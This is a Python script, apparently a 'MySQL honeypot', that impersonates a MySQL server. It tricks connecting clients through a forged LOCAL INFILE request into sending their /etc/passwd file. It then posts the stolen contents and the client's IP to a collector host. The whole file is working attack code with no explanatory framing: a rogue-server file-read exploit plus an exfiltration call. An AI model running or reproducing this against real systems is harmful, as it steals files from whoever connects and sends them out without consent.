import socket
import requests


def sendAttackInfo(ip, file):
    potID = socket.gethostname().split("Mysql")[1]
    url = 'http://10.21.196.121/mysqlHoneyPot/'
    data = {'ip': ip, 'file': file, 'potID': potID}
    requests.post(url, data)


if __name__ == '__main__':
    HOST = "0.0.0.0"
    PORT = 3306
    BUFFERSIZE = 10248
    filename = "/etc/passwd"
    length = (len(filename) + 1).to_bytes(length=1, byteorder='big')
    greeting = b"\x5b\x00\x00\x00\x0a" + bytes("5.7.34-0ubuntu0.18.04.2",
                                               encoding="ascii") + b"\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"
    authok = b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"
    payload = length + b"\x00\x00\x01\xfb" + bytes(filename, encoding="ascii")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(10)
    while True:
        conn, addr = s.accept()
        ip = addr[0]
        conn.send(greeting)
        while True:
            conn.recv(BUFFERSIZE)
            conn.send(authok)
            conn.recv(BUFFERSIZE)
            conn.send(payload)
            d = conn.recv(BUFFERSIZE)
            if not d:
                break
            temp = d.replace(b"\x00", b" ")
            file_detail = temp.decode('ascii', 'ignore')
            sendAttackInfo(ip, file_detail)
            break
        conn.close()
